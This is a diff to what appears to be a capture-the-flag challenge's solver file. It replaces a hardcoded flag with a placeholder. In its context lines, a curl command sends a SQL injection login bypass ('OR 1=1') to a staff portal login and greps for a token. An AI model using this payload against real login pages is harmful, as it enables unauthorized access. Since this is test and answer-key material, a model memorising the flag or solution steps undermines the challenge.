@@ -41,10 +41,10 @@ solver:
     command: curl -s -c /tmp/atlas_jar -b /tmp/atlas_jar -L -d "username=admin&password=anything' OR '1'='1" http://{target.branch-portal}/staff-portal/login | grep -o 'token=3xc3l'
     expect: token=3xc3l
   - name: Verify assembled flag
-    command: echo 'OCR{atl4s_h4rv3st_3xc3l}'
-    expect: OCR{atl4s_h4rv3st_3xc3l}
+    command: echo '{flag}'
+    expect: '{flag}'
 expected_flag_count: 1
-expected_flag: OCR{atl4s_h4rv3st_3xc3l}
+expected_flag: '{flag}'
 forbidden_networks:
 - control-plane
 - database
